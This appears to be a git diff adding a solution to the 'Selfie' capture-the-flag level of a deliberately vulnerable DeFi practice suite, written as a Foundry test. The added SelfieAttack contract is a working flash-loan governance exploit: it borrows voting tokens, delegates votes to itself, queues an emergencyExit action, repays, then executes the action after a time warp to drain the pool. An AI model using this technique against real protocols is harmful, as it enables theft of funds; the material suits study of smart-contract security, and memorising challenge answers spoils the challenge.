@@ -6,6 +6,45 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract SelfieAttack is IERC3156FlashBorrower {
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableVotes token;
+    address attacker;
+    address recovery;
+
+    uint256 actionId;
+
+    constructor(address _pool, address _governance, address _token, address _recovery) {
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        token = DamnValuableVotes(_token);
+        recovery = _recovery;
+    }
+
+    function onFlashLoan(address _initiator, address, uint256 amount, uint256 _fee, bytes calldata)
+        external
+        returns (bytes32)
+    {
+        require(msg.sender == address(pool));
+        require(_initiator == address(this));
+        token.delegate(address(this));
+        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));
+        token.approve(address(pool), amount + _fee);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function initiate() external {
+        pool.flashLoan(this, address(token), 1_500_000e18, "");
+    }
+
+    function execute() external {
+        governance.executeAction(actionId);
+    }
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +101,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieAttack attacker = new SelfieAttack(address(pool), address(governance), address(token), recovery);
+        attacker.initiate();
+        vm.warp(block.timestamp + 2 days);
+        attacker.execute();
     }
 
     /**
